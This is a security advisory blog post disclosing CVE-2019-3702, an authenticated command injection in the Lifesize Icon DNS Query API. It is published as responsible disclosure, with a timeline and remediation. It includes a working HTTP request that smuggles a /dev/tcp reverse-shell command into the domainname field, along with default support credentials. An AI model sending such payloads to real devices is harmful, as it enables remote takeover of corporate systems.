---
layout: post
title: "Remote Code Execution in Lifesize Icon"
date: 2019-03-26 09:00:00
image:
      url: /assets/pixabay/matrix-1799659_1920.jpg
author: 'Joshua Lehr'
author_image: "https://avatars1.githubusercontent.com/u/22133182?s=400&u=9c37c0c25738af0b47f4b2ab1c3adb0b26f80abf&v=4"
author_link: "https://github.com/noskill1337"
cve: "CVE-2019-3702"
cve_description: "A Remote Code Execution issue in the DNS Query Web UI in Lifesize Icon LS_RM3_3.7.0 (2421) allows remote authenticated attackers to execute arbitrary commands via a crafted DNS Query address field in a JSON API request."
cve_affectedVersion: "LS_RM3_3.7.0 (2421)"
cvss: "8.8"
cvss_vector: "3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
softwarePatchLink: "[https://cdn.lifesizecloud.com/](https://cdn.lifesizecloud.com/)"
---

## Overview

- Vulnerability: Remote Code Execution (RCE)
- Vendor: Lifesize
- Vendor Homepage: [https://www.lifesize.com/en](https://www.lifesize.com/en)
- Product: Lifesize Icon
- Version: {{ page.cve_affectedVersion }}

## Background

LifeSize Icon is a video collaboration platform and consists of various components, e.q. software, video and phone systems.

From the vendor's [website](https://www.lifesize.com/en/video-conferencing-app):
"Lifesize conferencing is streamlined and built to enhance all the different ways your team communicates — from one-on-one audio and video calls to full-scale company meetings among multiple locations. Replace outdated, costly, and audio-only services with more meaningful face-to-face conversations. Features like easy-to-use interface, screen sharing, and calendar integration make Lifesize’s an award-winning HD video conferencing solution. And, unlike consumer-grade apps, Lifesize was built for business. We have over a decade of experience designing HD conference room cameras and touchscreen conference phones. We stand behind our service with a financially backed SLA with 24x7x365 customer support."

## Issue Description

While analyzing the implementation of LifeSize Icon Software, one Remote Code Execution vulnerability has been identified, which can be exploited in order to execute arbitrary commands within the DNS Query address field. This vulnerability can be exploited by authenticated attackers with access to the web interface.

The system provides a JSON API, which exposes various methods like the DNS Query function. This function contains a address field that can be exploited with a remote command execution.

The following **HTTP request** illustrates this approach:

~~~ http
POST /rest/request/8cb1a00d113443c6a9a220104bbdea33/Comm_dnsQuery HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101
Firefox/63.0
Accept: */*
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://1.1.1.1/
X-Client: icon-web-client
Authorization: LSBasic c3VwcG9ydDpzdXBwb3J0
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 142
Connection: close

{"call":"Comm_dnsQuery","params":{"type":"A","domainname": "1.1.1.2; 0<&196;exec 196<>/dev/tcp/1.1.1.2/4446; sh <&196 >&196 2>&196"}}
~~~

## Impact

This vulnerability affects the confidentiality / integrity / availability of the system. This allows an attacker to read / manipulate the system. If an attacker is aware of the security issue, he or she may steal important data or compromise the system. With this vulnerability, a complete system compromise is possible.

## Remediation

In order to avoid this vulnerability, it's suggested to disable/update the software with this patch:
**{{ page.cve_affectedVersion }}**

{%if page.softwarePatchLink %}{{ site.softwarePatchText }}{{ page.softwarePatchLink }}{% else %}{{ "" }}{% endif %}

## CVE

- CVE: [{{ page.cve }}](https://cve.mitre.org/cgi-bin/cvename.cgi?name={{ page.cve }})
- CVSS Base Score: **{{ page.cvss }}**
- CVSS: {{ page.cvss_vector }}

## Credit

- {{ site.owner }}
- Patrick Muench

## Disclosure Timeline

- 2018-November-11: Discovered vulnerability
- 2019-Januar-03: Vendor Notification
- 2019-Januar-27: Vendor Response/Feedback
- 2019-May-12: Vendor Fix/Patch
- 2019-May-13: Public Disclosure

## Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

System administrators need tools like this to discover vulnerable hosts. This tool is offered for legal purposes only and to forward the security community's understanding of this vulnerability. As this PoC actively exploits the vulnerability, do not use against targets without prior permission.

The contents of this advisory are copyright (c) 2019 SVA System Vertrieb Alexander GmbH and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.

## License

{{ site.LicenseDisplay }}